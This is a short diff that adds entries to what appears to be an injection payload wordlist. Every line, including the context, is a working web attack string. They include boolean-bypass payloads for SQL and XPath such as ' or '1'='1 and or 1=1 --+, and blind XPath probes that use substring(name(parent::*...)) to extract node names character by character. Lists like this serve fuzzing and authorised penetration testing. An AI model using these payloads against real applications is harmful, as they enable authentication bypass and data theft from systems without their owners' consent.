@@ -12,3 +12,10 @@ x' or name()='username' or 'x'='y
 ' and count(/@*)=1 and '1'='1
 ' and count(/comment())=1 and '1'='1
 t']|//*| //*['
+' or '1'='1
+a' or '1'='1
+a' or 1=1 --+
+a' or 1=2 --+
+%' or '1'='1
+'or substring(name(parent::*[position()=1]),1,1)='a
+'or substring(name(parent::*[position()=1]),1,1)!='a
